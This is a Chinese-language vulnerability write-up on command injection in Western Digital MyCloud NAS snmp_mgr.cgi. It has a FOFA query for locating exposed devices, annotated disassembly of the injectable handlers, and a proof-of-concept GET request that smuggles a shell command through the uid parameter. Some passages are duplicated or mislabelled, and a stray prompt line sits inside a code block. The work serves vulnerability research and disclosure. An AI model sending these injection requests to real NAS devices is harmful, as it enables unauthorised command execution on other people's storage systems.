---
title: "西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞"
source: https://mrxn.net/jswz/west-cgi-bin-snmp_mgr-rce.html
asset_dir: assets/西部数据-nas-snmp_mgr.cgi-多处命令执行漏洞
---

# 西部数据 NAS snmp\_mgr.cgi 多处命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/14 12:02
- 764浏览
- [0评论](#comment)
- 3小时阅读

深入探索

技术文章订阅

安全工具开发

计算机安全

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS snmp\_mgr.cgi中存在多处命令执行漏洞，攻击者可通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> ```
> icon_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
> ```

# 漏洞分析

深入探索

网络安全会议

SQL注入检测工具

SQL注入防护

传参的逻辑在最上面也能看到

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-001-b163f8a48df3.webp)](https://image.mrxn.net/80c04e784a934a5da5c89522e4234767.webp)

程序首先调用 `cgiFormString` 函数，从HTTP请求中获取一个名为 `cmd` 的参数值。这个值决定了接下来要执行什么操作。

深入探索

安全研究报告

安全运维咨询

漏洞扫描器

根据漏洞通告，使用IDA打开 snmp\_mgr.cgi 搜索 **cgi\_SNMPv3\_delete\_one\_record** 定位到它的处理逻辑处

漏洞预警服务

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-002-9b8549b0c4f6.webp)](https://image.mrxn.net/f86c9910081c47d198418113390fc71d.webp)

程序通过一连串的 `strcmp` (字符串比较) 来判断 `cmd` 参数的值，并根据不同的值，跳转（`BL`指令）到不同的子函数执行相应的操作。

搜索引擎

## cgi\_SNMPv3\_delete\_one\_record

当**cmd=cgi\_SNMPv3\_delete\_one\_record** 时，跳转进入 **sub\_117E4** ，汇编处理逻辑如下

```
sub_117E4

var_48= -0x48

; __unwind {
PUSH            {LR}
SUB             SP, SP, #0x244
ADD             R1, SP, #0x248+var_48
MOV             R2, #0x40 ; '@'
LDR             R0, =aUid ; "uid"
BL              cgiFormString
ADD             R2, SP, #0x248+var_48
LDR             R1, =aSnmpToolRSDevN ; "snmp_tool -r \"%s\" >/dev/null 2>&1"
MOV             R0, SP  ; s
BL              sprintf
MOV             R0, SP  ; command
BL              system
LDR             R0, =command ; "snmp_tool -s >/dev/null 2>&1"
BL              system
LDR             R0, =aTextHtml ; "text/html"
BL              cgiHeaderContentType
ADD             SP, SP, #0x244
POP             {LR}
BX              LR
; End of function sub_117E4
```

到这就很清楚了，漏洞形成原因是直接将 uid 拼接进 snmp\_tool 命令工具的参数里面，从而导致的[命令注入漏洞](https://mrxn.net/tag/rce)。

## cgi\_get\_SNMPv3\_one\_record

存在同样漏洞的还有 cgi\_get\_SNMPv3\_one\_record（sub\_11178），汇编处理逻辑如下

漏洞预警服务

```
sub_11178

var_28= -0x28
var_24= -0x24
var_20= -0x20
var_1C= -0x1C
var_18= -0x18
var_14= -0x14
var_10= -0x10
var_C= -0xC

; __unwind {
PUSH            {LR}
MOV             R3, #0
SUB             SP, SP, #0x224
MOV             R1, R3  ; c
MOV             R0, SP  ; s
MOV             R2, #0x200 ; n
STR             R3, [SP,#0x228+var_28]
STR             R3, [SP,#0x228+var_24]
STR             R3, [SP,#0x228+var_20]
STR             R3, [SP,#0x228+var_1C]
STR             R3, [SP,#0x228+var_18]
STR             R3, [SP,#0x228+var_14]
STR             R3, [SP,#0x228+var_10]
STR             R3, [SP,#0x228+var_C]
BL              memset
ADD             R1, SP, #0x228+var_28
MOV             R2, #0x20 ; ' '
LDR             R0, =aUid ; "uid"
BL              cgiFormString
ADD             R2, SP, #0x228+var_28
LDR             R1, =aSnmpToolUSDevN ; "snmp_tool -U \"%s\" >/dev/null 2>&1"
MOV             R0, SP  ; s
BL              sprintf
MOV             R0, SP  ; command
BL              system
LDR             R0, =aTextHtml ; "text/html"
BL              cgiHeaderContentType
ADD             SP, SP, #0x224
POP             {LR}
BX              LR
; End of function sub_11178
```

也是将 uid 直接拼接进 snmp\_tool 命令工具的参数里面，从而导致的[命令注入](https://mrxn.net/tag/rce)漏洞。

## cgi\_set\_SNMP\_v2

当cmd=cgi\_set\_SNMP\_v2 时，会跳转到 sub\_1150C ，其汇编处理如下

漏洞预警服务

```
sub_1150C

command= -0x348
s= -0x148
var_C8= -0xC8
var_48= -0x48
var_44= -0x44
var_40= -0x40
var_3C= -0x3C
var_38= -0x38
var_34= -0x34
var_30= -0x30
var_2C= -0x2C
var_28= -0x28
var_24= -0x24
var_20= -0x20
var_1C= -0x1C
var_18= -0x18
var_14= -0x14

; __unwind {
PUSH            {R4-R6,LR}
SUB             SP, SP, #0x730
SUB             SP, SP, #8
MOV             R4, #0
MOV             R6, #0x80
MOV             R1, R4  ; c
MOV             R2, R6  ; n
ADD             R0, SP, #0x748+s ; s
MOV             R5, #0x200
STR             R4, [SP,#0x748+var_28]
STR             R4, [SP,#0x748+var_24]
STR             R4, [SP,#0x748+var_20]
STR             R4, [SP,#0x748+var_1C]
STR             R4, [SP,#0x748+var_18]
STR             R4, [SP,#0x748+var_14]
BL              memset
MOV             R1, R4  ; c
MOV             R2, R6  ; n
ADD             R0, SP, #0x748+var_C8 ; s
BL              memset
MOV             R1, R4  ; c
MOV             R2, R5  ; n
MOV             R0, SP  ; s
BL              memset
MOV             R1, R4  ; c
MOV             R2, R5  ; n
ADD             R0, SP, R5 ; s
BL              memset
MOV             R1, R4  ; c
MOV             R2, R5  ; n
ADD             R0, SP, #0x748+command ; s
STR             R4, [SP,#0x748+var_48]
STR             R4, [SP,#0x748+var_44]
STR             R4, [SP,#0x748+var_40]
STR             R4, [SP,#0x748+var_3C]
STR             R4, [SP,#0x748+var_38]
STR             R4, [SP,#0x748+var_34]
STR             R4, [SP,#0x748+var_30]
STR             R4, [SP,#0x748+var_2C]
BL              memset
ADD             R1, SP, #0x748+var_28
MOV             R2, #8
LDR             R0, =aFEnable ; "f_enable"
BL              cgiFormString
ADD             R1, SP, #0x748+var_28
ADD             R1, R1, #8
MOV             R2, #8
LDR             R0, =aSnmpEnabledLev ; "snmp_enabled_level"
BL              cgiFormString
MOV             R1, SP
MOV             R2, R5
LDR             R0, =aSnmpSyslocatio ; "snmp_syslocation"
BL              cgiFormString
MOV             R2, R5
ADD             R1, SP, R5
LDR             R0, =aSnmpSyscontact ; "snmp_syscontact"
BL              cgiFormString
ADD             R1, SP, #0x748+s
MOV             R2, R6
LDR             R0, =aFCommunity ; "f_community"
BL              cgiFormString
MOV             R2, R6
ADD             R1, SP, #0x748+var_C8
LDR             R0, =aNotificationCo ; "notification_community"
BL              cgiFormString
ADD             R1, SP, #0x748+var_18
MOV             R2, #8
LDR             R0, =aNotificationEn ; "notification_enable"
BL              cgiFormString
ADD             R1, SP, #0x748+var_48
MOV             R2, #0x20 ; ' '
LDR             R0, =aIp ; "ip"
BL              cgiFormString
ADD             R2, SP, #0x748+var_28
LDR             R1, =aSnmpToolBSDevN ; "snmp_tool -B %s >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; s
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
ADD             R2, SP, #0x748+var_28
ADD             R2, R2, #8
ADD             R0, SP, #0x748+command ; s
LDR             R1, =aSnmpToolBSDevN_0 ; "snmp_tool -b %s >/dev/null 2>&1"
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
ADD             R0, SP, #0x748+s
BL              sub_11000
ADD             R2, SP, #0x748+s
LDR             R1, =aSnmpToolZSDevN ; "snmp_tool -Z \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; s
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
MOV             R0, SP
BL              sub_11000
MOV             R2, SP
LDR             R1, =aSnmpToolLSDevN ; "snmp_tool -L \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; s
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
ADD             R0, SP, R5
BL              sub_11000
ADD             R2, SP, R5
LDR             R1, =aSnmpToolCSDevN ; "snmp_tool -C \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; s
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
ADD             R2, SP, #0x748+var_18
LDR             R1, =aSnmpToolESDevN ; "snmp_tool -E %s >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; s
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
ADD             R0, SP, #0x748+var_C8
BL              sub_11000
ADD             R2, SP, #0x748+var_C8
ADD             R3, SP, #0x748+var_48
ADD             R0, SP, #0x748+command ; s
LDR             R1, =aSnmpToolOSOSDe ; "snmp_tool -o \"%s\" -O \"%s\" >/dev/nul"...
BL              sprintf
ADD             R0, SP, #0x748+command ; command
BL              system
LDR             R0, =command ; "snmp_tool -s >/dev/null 2>&1"
BL              system
LDR             R0, =aTextHtml ; "text/html"
BL              cgiHeaderContentType
ADD             SP, SP, #0x338
ADD             SP, SP, #0x400
POP             {R4-R6,LR}
BX              LR
; End of function sub_1150C
```

程序依次调用 `cgiFormString` 函数来获取HTTP请求中的多个参数值，并将它们存储到栈上的不同缓冲区中。

- `f_enable` (存入 `SP + 0x748 + var_28`，大小为8字节)
- `snmp_enabled_level` (存入 `SP + 0x748 + var_28 + 8`，大小为8字节)
- `snmp_syslocation` (存入 `SP`，大小为512字节)
- `snmp_syscontact` (存入 `SP + R5`，大小为512字节)
- `f_community` (存入 `SP + 0x748 + s`，大小为128字节)
- `notification_community` (存入 `SP + 0x748 + var_C8`，大小为128字节)
- `notification_enable` (存入 `SP + 0x748 + var_18`，大小为8字节)
- `ip` (存入 `SP + 0x748 + var_48`，大小为32字节)

在进行利用需要注意长度大小，可以选取大一点的如128或512字节的参数进行利用。

程序会多次使用 `sprintf` 和 `system` 来执行 `snmp_tool` 命令：

**设置** **SNMP** **启用状态 (**`-B`**)**:

```
ADD             R2, SP, #0x748+var_28  ; R2 指向 f_enable 参数的缓冲区
LDR             R1, =aSnmpToolBSDevN ; "snmp_tool -B %s >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `f_enable` 的值替换。

**设置 SNMP 启用级别 (**`-b`**)**:

```
ADD             R2, SP, #0x748+var_28  ; R2 指向 f_enable 参数的缓冲区
ADD             R2, R2, #8             ; 偏移8字节，指向 snmp_enabled_level 参数的缓冲区
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
LDR             R1, =aSnmpToolBSDevN_0 ; "snmp_tool -b %s >/dev/null 2>&1"
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

- 这里 `%s` 会被 `snmp_enabled_level` 的值替换。

**处理** `f_community` **参数**:

```
ADD             R0, SP, #0x748+s       ; R0 指向 f_community 参数的缓冲区
BL              sub_11000              ; 调用 sub_11000 处理 f_community
ADD             R2, SP, #0x748+s       ; R2 指向 f_community 参数的缓冲区
LDR             R1, =aSnmpToolZSDevN ; "snmp_tool -Z \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `f_community` 的值替换。请注意 `sub_11000` 会对 `\` 和 `"` 进行转义，但不会对 `;`, `|`, `&` 等shell元字符进行转义。

**处理** `snmp_syslocation` **参数**:

```
MOV             R0, SP                 ; R0 指向 snmp_syslocation 参数的缓冲区
BL              sub_11000              ; 调用 sub_11000 处理 snmp_syslocation
MOV             R2, SP                 ; R2 指向 snmp_syslocation 参数的缓冲区
LDR             R1, =aSnmpToolLSDevN ; "snmp_tool -L \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `snmp_syslocation` 的值替换。

**处理** `snmp_syscontact` **参数**:

```
ADD             R0, SP, R5             ; R0 指向 snmp_syscontact 参数的缓冲区
BL              sub_11000              ; 调用 sub_11000 处理 snmp_syscontact
ADD             R2, SP, R5             ; R2 指向 snmp_syscontact 参数的缓冲区
LDR             R1, =aSnmpToolCSDevN ; "snmp_tool -C \"%s\" >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `snmp_syscontact` 的值替换。

**处理** `notification_enable` **参数**:

```
ADD             R2, SP, #0x748+var_18  ; R2 指向 notification_enable 参数的缓冲区
LDR             R1, =aSnmpToolESDevN ; "snmp_tool -E %s >/dev/null 2>&1"
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `notification_enable` 的值替换。

**处理** `notification_community` **和** `ip` **参数**:

```
ADD             R0, SP, #0x748+var_C8  ; R0 指向 notification_community 参数的缓冲区
BL              sub_11000              ; 调用 sub_11000 处理 notification_community
ADD             R2, SP, #0x748+var_C8  ; R2 指向 notification_community 参数的缓冲区
ADD             R3, SP, #0x748+var_48  ; R3 指向 ip 参数的缓冲区
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
LDR             R1, =aSnmpToolOSOSDe ; "snmp_tool -o \"%s\" -O \"%s\" >/dev/nul"...
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会被 `notification_enable` 的值替换。

**处理** `notification_community` **和** `ip` **参数**:

```
ADD             R0, SP, #0x748+var_C8  ; R0 指向 notification_community 参数的缓冲区
BL              sub_11000              ; 调用 sub_11000 处理 notification_community
ADD             R2, SP, #0x748+var_C8  ; R2 指向 notification_community 参数的缓冲区
ADD             R3, SP, #0x748+var_48  ; R3 指向 ip 参数的缓冲区
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
LDR             R1, =aSnmpToolOSOSDe ; "snmp_tool -o \"%s\" -O \"%s\" >/dev/nul"...
BL              sprintf                ; 格式化命令
ADD             R0, SP, #0x748+command ; R0 指向 command 缓冲区
BL              system                 ; 执行命令
```

这里 `%s` 会分别被 `notification_community` 和 `ip` 的值替换。

**重新启动** **SNMP** **服务**:

```
LDR             R0, =command ; "snmp_tool -s >/dev/null 2>&1"
BL              system       ; 执行命令
```

这是一个硬编码的命令，用于重启SNMP服务。

根据缓冲区大小，当前逻辑下，各个参数的缓冲区大小以及是否可利用如下表

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-003-a1e74a66d5d5.webp)](https://image.mrxn.net/323faa194b9d4fd4b9d2223e96be2451.webp)

## cgi\_set\_SNMPv3\_one\_record

```
解释下下面的汇编代码
sub_111FC

var_88C= -0x88C
var_888= -0x888
var_884= -0x884
var_880= -0x880
var_87C= -0x87C
var_870= -0x870
var_670= -0x670
var_46C= -0x46C
var_27C= -0x27C
var_7C= -0x7C
var_3C= -0x3C
var_1C= -0x1C
nptr= -0xC
var_8= -8

; __unwind {
PUSH            {R4-R8,R10,LR}
SUB             SP, SP, #0x880
SUB             SP, SP, #0xC
MOV             R5, #0
ADD             R1, SP, #0x88C+nptr
MOV             R2, #8
ADD             R7, SP, #0x860
LDR             R0, =aDataLen ; "data_len"
ADD             R6, SP, #0x88C+var_670
STR             R5, [SP,#0x88C+nptr]
ADD             R8, SP, #0x88C+var_1C
STR             R5, [SP,#0x88C+var_8]
BL              cgiFormString
MOV             R1, R5  ; endptr
MOV             R2, #0xA ; base
ADD             R0, SP, #0x88C+nptr ; nptr
ADD             R10, SP, #0x88C+var_7C
BL              strtol
ADD             R10, R10, #0xC
ADD             R0, R0, #1 ; size
BL              malloc
MOV             R1, R5  ; endptr
MOV             R2, #0xA ; base
MOV             R4, R0
ADD             R0, SP, #0x88C+nptr ; nptr
BL              strtol
MOV             R1, R4
ADD             R2, R0, #1
LDR             R0, =aData ; "data"
BL              cgiFormString
ADD             R2, SP, #0x88C+var_870
MOV             R0, R4
MOV             R1, #1
BL              sub_10F34
MOV             R0, R4
ADD             R2, SP, #0x88C+var_3C
MOV             R1, #2
BL              sub_10F34
MOV             R0, R4
MOV             R2, R7
MOV             R1, #3
BL              sub_10F34
MOV             R0, R4
MOV             R2, R6
MOV             R1, #4
BL              sub_10F34
MOV             R0, R4
MOV             R2, R8
MOV             R1, #5
BL              sub_10F34
ADD             R3, SP, #0x88C+var_46C
ADD             R3, R3, #8
MOV             R0, R4
SUB             R5, R3, #0xC
MOV             R1, #6
MOV             R2, R5
BL              sub_10F34
MOV             R2, R10
MOV             R1, #7
MOV             R0, R4
BL              sub_10F34
MOV             R0, R6
BL              sub_11000
MOV             R0, R5
BL              sub_11000
ADD             R0, SP, #0x88C+var_27C
ADD             R2, SP, #0x88C+var_870
ADD             R3, SP, #0x88C+var_3C
LDR             R1, =aSnmpToolV3USLS ; "snmp_tool -v 3 -u \"%s\" -l \"%s\" -a "...
ADD             R0, R0, #0xC ; s
STR             R7, [SP,#0x88C+var_88C]
STR             R6, [SP,#0x88C+var_888]
STR             R5, [SP,#0x88C+var_880]
STR             R8, [SP,#0x88C+var_884]
STR             R10, [SP,#0x88C+var_87C]
BL              sprintf
ADD             R0, SP, #0x88C+var_27C
ADD             R0, R0, #0xC ; command
BL              system
LDR             R0, =command ; "snmp_tool -s >/dev/null 2>&1"
BL              system
MOV             R0, R4  ; ptr
BL              free
LDR             R0, =aTextHtml ; "text/html"
BL              cgiHeaderContentType
ADD             SP, SP, #0x8C
ADD             SP, SP, #0x800
POP             {R4-R8,R10,LR}
BX              LR
; End of function sub_111FC
```

此函数的功能是接收一个包含多项配置的XML-like数据块，解析它，然后用解析出的值构造一个复杂的命令行来配置SNMPv3用户。与之前分析的函数类似，这个函数也存在**极其严重的命令注入漏洞**，因为解析出的用户数据在未经充分过滤的情况下被直接拼接到 `system()` 调用中。

代码安全审计

**详细执行流程**

1. **初始化与\*\***内存**\*\*分配 (Initialization and** **Memory Allocation\*\***)\*\*:
   1. 函数在栈上分配了 `0x88C` (约2.2KB) 的巨大空间。
   2. `cgiFormString` 首先获取 `data_len` 参数，这个参数指明了后续 `data` 参数的长度。
   3. 程序使用 `strtol` 将 `data_len` 转换为数字，然后调用 `malloc` 分配一块大小为 `data_len + 1` 的堆内存。这块内存（指针存在 `R4`）将用于存储 `data` 参数的内容。
   4. 接着，程序调用 `cgiFormString` 将 `data` 参数的内容读入刚刚分配的堆内存中。
2. **数据解析 (Data Parsing)**: 这是该函数的核心部分。程序假设 `data` 参数是一个包含多个字段的结构化字符串（可能是简化的XML或类似格式）。它通过**多次调用** `sub_10F34` **函数**来解析出各个字段的值。
   1. `sub_10F34` **的作用**: 这个子函数 `sub_10F34(char *data_blob, int field_index, char *output_buffer)` 的功能是从输入的 `data_blob` 中，根据 `field_index`（字段索引，如1, 2, 3...）提取出第 N 个 `<cell>` 标签内的内容，并将其复制到 `output_buffer` 中。
   2. **解析过程**:
      - `sub_10F34(R4, 1, ...)`: 解析第1个字段，存入 `[SP+0x88C+var_870]`。
      - `sub_10F34(R4, 2, ...)`: 解析第2个字段，存入 `[SP+0x88C+var_3C]`。
      - ...依此类推，一共解析了7个字段，分别存放在栈上的不同缓冲区中。
3. **不充分的过滤 (Insufficient Filtering)**:
   1. `MOV R0, R6` / `BL sub_11000`: 对第4个解析出的字段（存放在 `R6` 指向的缓冲区）调用 `sub_11000` 进行过滤。
   2. `MOV R0, R5` / `BL sub_11000`: 对第6个解析出的字段（存放在 `R5` 指向的缓冲区）调用 `sub_11000` 进行过滤。
   3. **关键缺陷**: 正如之前分析，`sub_11000` 函数的过滤机制是无效的，它无法阻止命令注入。**更重要的是，其他5个解析出的字段完全没有经过任何过滤！**
4. **构造并执行命令 (Command Construction and Execution)**:
   1. `sprintf`: 程序使用 `sprintf` 将所有7个解析出的字段值拼接到一个非常长的命令行格式字符串 `aSnmpToolV3USLS` 中。
   2. `"snmp_tool -v 3 -u \"%s\" -l \"%s\" -a \"%s\" -A \"%s\" -x \"%s\" -X \"%s\" -V \"%s\" >/dev/null 2>&1"`
   3. 这里的 `%s` 占位符会被依次替换为从 `data` 参数中解析出的7个字段的值。
   4. `system()`: 拼接好的命令字符串被传递给 `system()` 执行。
5. **收尾工作**:
   1. 执行 `snmp_tool -s` 命令来保存设置。
   2. 调用 `free(R4)` 释放之前为 `data` 分配的堆内存。
   3. 返回HTTP响应头。

## cgi\_SNMPv3\_modify\_one\_record

和上面的一样的逻辑

漏洞预警服务

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-004-b0417ccaecfe.webp)](https://image.mrxn.net/0cf79e89877c456fbc3209ae2a3e0d58.webp)

# 漏洞复现

## cgi\_SNMPv3\_delete\_one\_record

```
GET /cgi-bin/snmp_mgr.cgi?cmd=cgi_SNMPv3_delete_one_record&uid=%24(touch%20/var/www/t.png) HTTP/1.1
Host: west.mrxn.net
```

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-005-f9d7fc6ba228.webp)](https://image.mrxn.net/fbc4e23d14354d32ad2b6e7963ebca3f.webp)

访问生成的文件，成功创建

代码安全审计

## cgi\_set\_SNMP\_v2

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-006-077396cc5d37.webp)](https://image.mrxn.net/b9df59916e58408bb4120fd30dea88f1.webp)

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-007-7f674277fd0c.webp)](https://image.mrxn.net/9718b80c03ae49f8b6d6eb49235bd99f.webp)

成功执行命令

## cgi\_SNMPv3\_modify\_one\_record

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-008-e31c96e85047.webp)](https://image.mrxn.net/0c3d5ef7edc543269eae1ceb0ea4404f.webp)

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-009-a40d12dca802.webp)](https://image.mrxn.net/502dfb92c88d48a0916a58e0b2cf4a31.webp)

## cgi\_set\_SNMPv3\_one\_record

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-010-62c4a5d14d74.webp)](https://image.mrxn.net/ba9f173a99c34ee0949f3864bbe993e7.webp)

[![西部数据 NAS  snmp_mgr.cgi 多处命令执行漏洞](images/img-011-fa2f0e0676ac.webp)](https://image.mrxn.net/73e44dcc2d93483dbcbadfc739f62ad4.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.cgi\_SNMPv3\_delete\_one\_record](#toc-4-1-)
- [4.2.cgi\_get\_SNMPv3\_one\_record](#toc-4-2-)
- [4.3.cgi\_set\_SNMP\_v2](#toc-4-3-)
- [4.4.cgi\_set\_SNMPv3\_one\_record](#toc-4-4-)
- [4.5.cgi\_SNMPv3\_modify\_one\_record](#toc-4-5-)
- [5.漏洞复现](#toc-5-)
- [5.1.cgi\_SNMPv3\_delete\_one\_record](#toc-5-1-)
- [5.2.cgi\_set\_SNMP\_v2](#toc-5-2-)
- [5.3.cgi\_SNMPv3\_modify\_one\_record](#toc-5-3-)
- [5.4.cgi\_set\_SNMPv3\_one\_record](#toc-5-4-)

  
  

![](data:image/png;base64,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